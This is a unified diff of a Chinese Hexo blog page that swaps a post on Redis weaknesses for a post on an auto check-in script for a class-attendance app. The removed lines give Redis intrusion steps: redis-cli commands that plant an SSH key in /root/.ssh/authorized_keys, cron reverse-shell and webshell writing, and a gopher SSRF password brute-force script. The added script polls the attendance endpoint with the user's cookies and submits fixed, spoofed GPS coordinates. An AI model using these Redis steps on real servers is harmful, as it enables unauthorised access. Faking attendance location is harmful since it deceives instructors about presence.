@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title> Jw5t</title>
+      <title>班级魔方自动签到脚本 |  Jw5t</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="http://tva1.sinaimg.cn/large/007axxUTgy1gvl7m2su1sj60hs0hswg402.jpg" />
@@ -54,24 +54,38 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-redis漏洞总结"
+  id="post-班级魔方签到脚本"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  班级魔方自动签到脚本
+</h1>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2022/03/31/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2022-03-31T13:50:36.418Z" itemprop="datePublished">2022-03-31</time>
-</a>   
+      <a href="/2022/03/19/%E7%8F%AD%E7%BA%A7%E9%AD%94%E6%96%B9%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/" class="article-date">
+  <time datetime="2022-03-19T04:12:57.000Z" itemprop="datePublished">2022-03-19</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+  
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">797</span>
+            <span class="post-count">743</span>
         </span>
     </span>
 
@@ -95,34 +109,18 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: redis漏洞总结</span><br><span class="line">date: 2019-05-26 12:12:57</span><br><span class="line">categories: </span><br><span class="line">- web</span><br></pre></td></tr></table></figure>
+  <h1 id="班级魔方自动签到脚本"><a href="#班级魔方自动签到脚本" class="headerlink" title="班级魔方自动签到脚本"></a>班级魔方自动签到脚本</h1><h2 id="经过了艰苦的ios抓包（划掉）加上一点点写python的时间，搞了一个自动签到脚本"><a href="#经过了艰苦的ios抓包（划掉）加上一点点写python的时间，搞了一个自动签到脚本" class="headerlink" title="经过了艰苦的ios抓包（划掉）加上一点点写python的时间，搞了一个自动签到脚本"></a>经过了艰苦的ios抓包（划掉）加上一点点写python的时间，搞了一个自动签到脚本</h2><p>使用方法：</p>
+<p>需要仨参数，你的班级课程id，你的cookie，和你要定位的地方</p>
+<h3 id="第一个是课程id-先进去"><a href="#第一个是课程id-先进去" class="headerlink" title="第一个是课程id,先进去"></a>第一个是课程id,先进去</h3><p><img src="http://tva1.sinaimg.cn/large/008smPl2gy1h1qyltsgywj313d0enae7.jpg" alt="image1.png"></p>
+<p><img src="http://tva1.sinaimg.cn/large/008smPl2gy1h1qynfzrlvj30m806bt9z.jpg" alt="image.png"></p>
+<p>这个数字就是课程id</p>
+<p><img src="http://tva1.sinaimg.cn/large/008smPl2gy1h1qyp1jz3aj31o00uzaym.jpg" alt="image3.png"></p>
+<p>这个就是    ，添加进去</p>
+<p>里面的wxid有点麻烦，要抓微信的包 ，搜索一次抓个包就好了</p>
+<p>最后一个gps 的定位，懂得都懂</p>
+<p>第二个是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"># 51324</span><br><span class="line"># 50965 老师</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#需要更改你的课程id  courseid</span><br><span class="line">#还需要你想要的定位，这里我用的是奥维互动地图</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">courseid=50965  #这个需要改</span><br><span class="line"></span><br><span class="line">url = &quot;https://k8n.cn//student/course/&quot;+str(courseid)+&quot;/punchs&quot;</span><br><span class="line">header = &#123;&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">                 &quot;User-Agent&quot;: &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.20(0x1800142e) NetType/WIFI L&quot;,</span><br><span class="line">                 &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">                 &quot;Referer&quot;: &quot;http://k8n.cn/student/course/&quot;+str(courseid),</span><br><span class="line">                 &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">                 &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">                 &quot;Connection&quot;: &quot;keep-alive&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookie=&#123;&quot;yxktmf&quot;:&quot;&quot;,</span><br><span class="line">        &quot;remember_student_52ba36addc2b2f9401580f014c7f58ea4e30989d&quot;:&quot;&quot;,</span><br><span class="line">        &quot;remember_teacher_52ba36addc2b2f9401580f014c7f58ea4e30989d&quot;:&quot;&quot;,</span><br><span class="line">        &quot;wxid&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">d_time = datetime.datetime.strptime(str(datetime.datetime.now().date()) + &#x27;7:00&#x27;, &#x27;%Y-%m-%d%H:%M&#x27;)</span><br><span class="line">d_time1 = datetime.datetime.strptime(str(datetime.datetime.now().date()) + &#x27;18:00&#x27;, &#x27;%Y-%m-%d%H:%M&#x27;)</span><br><span class="line">n_time = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">tempid=1234</span><br><span class="line"></span><br><span class="line">while(True):</span><br><span class="line">    try:</span><br><span class="line">        a = requests.get(url, headers=header, cookies=cookie).text</span><br><span class="line">        tempid = re.search(&#x27;id=&quot;punchcard_(.*?)&quot;&gt;&#x27;, a, flags=0).group(1)</span><br><span class="line">    except AttributeError:</span><br><span class="line">        print(&quot;当前没有签到&quot; + (time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())))</span><br><span class="line">        if n_time &gt; d_time and n_time &lt; d_time1:</span><br><span class="line">            time.sleep(300)</span><br><span class="line">        else:</span><br><span class="line">            time.sleep(3600)</span><br><span class="line">    except requests.exceptions.ConnectionError:</span><br><span class="line">        print(&#x27;连接出错&#x27;)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">    except requests.exceptions.ChunkedEncodingError:</span><br><span class="line">        print(&#x27;块编码错误&#x27;)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">    except OSError:</span><br><span class="line">        print(&quot;系统错误&quot;)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;系统错误&#x27;)</span><br><span class="line">        time.sleep(3)</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        data_gcl = &#123;</span><br><span class="line">            &quot;id&quot;: tempid,</span><br><span class="line">            &quot;lat&quot;: &quot;70.494190216064453&quot;,     # 你的地理定位</span><br><span class="line">            &quot;lng&quot;: &quot;714.44215393066406&quot;,     # 你的地理定位</span><br><span class="line">            &quot;acc&quot;: &quot;35&quot;,</span><br><span class="line">            &quot;res&quot;: &quot;&quot;,</span><br><span class="line">            &quot;gps_addr&quot;: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        data_jxq = &#123;</span><br><span class="line">            &quot;id&quot;: tempid,</span><br><span class="line">            &quot;lat&quot;: &quot;70.494210486064453&quot;,    # 你的地理定位</span><br><span class="line">            &quot;lng&quot;: &quot;714.44042936066406&quot;,    # 你的地理定位</span><br><span class="line">            &quot;acc&quot;: &quot;35&quot;,</span><br><span class="line">            &quot;res&quot;: &quot;&quot;,</span><br><span class="line">            &quot;gps_addr&quot;: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            b1 = requests.post(url, headers=header, cookies=cookie, data=data_jxq).text</span><br><span class="line">            b2 = requests.post(url, headers=header, cookies=cookie, data=data_gcl).text</span><br><span class="line"></span><br><span class="line">            if( &#x27;成功&#x27; in b1 )or (&#x27;成功&#x27; in b2):</span><br><span class="line">                print(&quot;成功签到&quot; + (time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())))</span><br><span class="line">                print(&quot;===============================================================&quot;)</span><br><span class="line">                print(&quot;===============================================================&quot;)</span><br><span class="line">                print(&quot;===============================================================&quot;)</span><br><span class="line">            time.sleep(10)</span><br><span class="line">        except AttributeError:</span><br><span class="line">            print(&quot;当前没有签到&quot; + (time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())))</span><br><span class="line">            if n_time &gt; d_time and n_time &lt; d_time1:</span><br><span class="line">                time.sleep(300)</span><br><span class="line">            else:</span><br><span class="line">                time.sleep(3600)</span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            print(&#x27;连接出错&#x27;)</span><br><span class="line">            time.sleep(3)</span><br><span class="line">        except requests.exceptions.ChunkedEncodingError:</span><br><span class="line">            print(&#x27;块编码错误&#x27;)</span><br><span class="line">            time.sleep(3)</span><br><span class="line">        except OSError:</span><br><span class="line">            print(&quot;系统错误&quot;)</span><br><span class="line">            time.sleep(3)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;未知错误&#x27;)</span><br><span class="line">            time.sleep(3)</span><br></pre></td></tr></table></figure>
 
-
-
-<h1 id="redis漏洞总结"><a href="#redis漏洞总结" class="headerlink" title="redis漏洞总结"></a>redis漏洞总结</h1><p>redis的漏洞主要出在配置错误</p>
-<p>redis配置了不当的白名单，如redis默认是绑定0.0.0.0:6379</p>
-<p>所以当我们需要渗透一个redis的时候，如果目标服务器存在这些情况</p>
-<ul>
-<li>redis以root权限启动</li>
-<li>redis是弱口令或者根本没有设置口令</li>
-<li>redis在公网上对任意ip开放，如绑定0.0.0.0:6379</li>
-</ul>
-<p>我们就可以对其进行渗透</p>
-<ul>
-<li><p>写SSH公钥</p>
-<ul>
-<li><p>首先在我们本地生成公钥，因为此时我们已经通过弱口令或者无口令登录到了redis，我们将redis的默认路径改到/root/.ssh/，然后设置保存的文件名为authorized_keys， 再通过set 进行写入公钥，这样我们就可以免密登录目标服务器了</p>
-</li>
-<li><p>```<br>redis-cli -h 192.168.33.134        #连接目标主机redis<br>config get dir                  #检查当前保存路径<br>config get dbfilename              #检查保存文件名<br>config set dir /root/.ssh/         #设置保存路径<br>config set dbfilename authorized_keys #设置保存文件名<br>set test “\n\n\n 公钥 \n\n\n”         #将公钥写入test健<br>save                         #进行保存    </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 通过计划任务反弹shell</span><br><span class="line"></span><br><span class="line">  - 计划任务的路径是 /var/spool/cron 这个方式是和写SSH公钥是一样的，我们同样先设置保存路径为  /var/spool/cron，保存的文件名是shell，使用set命令进行写入，本地用nc监听个端口就好了</span><br><span class="line"></span><br><span class="line">- 向目标服务器写webshell，原理也是一样的，需要这个服务器开启了web服务，但是这个需要知道 **web的绝对路径**，向web目录协议个webshell 然后蚁剑冰蝎哥斯拉去连接就好了</span><br><span class="line"></span><br><span class="line">- 使用主从服务器同步，因为这个是分布式服务器，如果设置了主机负责写，从机负责读的话，就可以，写到主机里面，然后redis会自动同步到从机</span><br><span class="line"></span><br><span class="line">  - 这个打多了会瘫痪</span><br><span class="line"></span><br><span class="line">- ssrf，因为这个是算打内网了，需要**目标机存在dict协议**</span><br><span class="line"></span><br><span class="line">  - `Gopher` 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了</span><br><span class="line">    `Gopher` 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</span><br><span class="line"></span><br><span class="line">  - 探测协议</span><br><span class="line"></span><br><span class="line">    - gopher://</span><br><span class="line">    - dict://</span><br><span class="line"></span><br><span class="line">  - [木头师傅](http://www.wjlshare.xyz/)的弱口令爆破脚本(结合 SSRF)：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    import requests</span><br><span class="line">    </span><br><span class="line">    target = &quot;http://x.x.x.x:6666/index.php?url=&quot;  # 请输入目标url</span><br><span class="line">    rhost = &quot;127.0.0.1&quot;   </span><br><span class="line">    rport = &quot;6379&quot;</span><br><span class="line">    </span><br><span class="line">    with open(&quot;passwords.txt&quot;,&quot;r+&quot;) as file:</span><br><span class="line">        passwds = file.readlines()</span><br><span class="line">        for passwd in passwds:</span><br><span class="line">            passwd = passwd.strip(&quot;\n&quot;)</span><br><span class="line">            len_pass = len(passwd)</span><br><span class="line">            payload = r&quot;gopher://&quot; + rhost + &quot;:&quot; + rport + &quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;+str(len_pass)+r&quot;%250d%250a&quot;+passwd+r&quot;%250D%250A%252A1%250D%250A&quot;</span><br><span class="line">            url = target+str(payload)</span><br><span class="line">            text = requests.get(url).text</span><br><span class="line">            if &quot;OK&quot; in text:</span><br><span class="line">                print(&quot;[+] 爆破成功 密码为: &quot; + passwd)</span><br><span class="line">                print(text + payload)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>redis写lua</p>
-<ul>
-<li>redis2.6之前内置了lua脚本环境在redis未授权的情况下可以利用lua执行系统命令</li>
-</ul>
-</li>
-</ul>
  
       <!-- reward -->
       
@@ -193,7 +191,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/31/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/19/%E7%8F%AD%E7%BA%A7%E9%AD%94%E6%96%B9%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -204,19 +202,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/03/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Bwindows/" class="article-nav-link">
+      <a href="/2022/03/19/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Blinux/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            (no title)
+            红蓝对抗应急响应之linux提权总结
           
         </div>
       </a>
     
     
-      <a href="/2022/03/26/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1sql%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+      <a href="/2022/02/27/%E5%90%91%E6%97%A5%E8%91%B5rce/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">java代码审计-sql注入</div>
+        <div class="article-nav-title">向日葵rce复现和原理分析</div>
       </a>
     
   </nav>
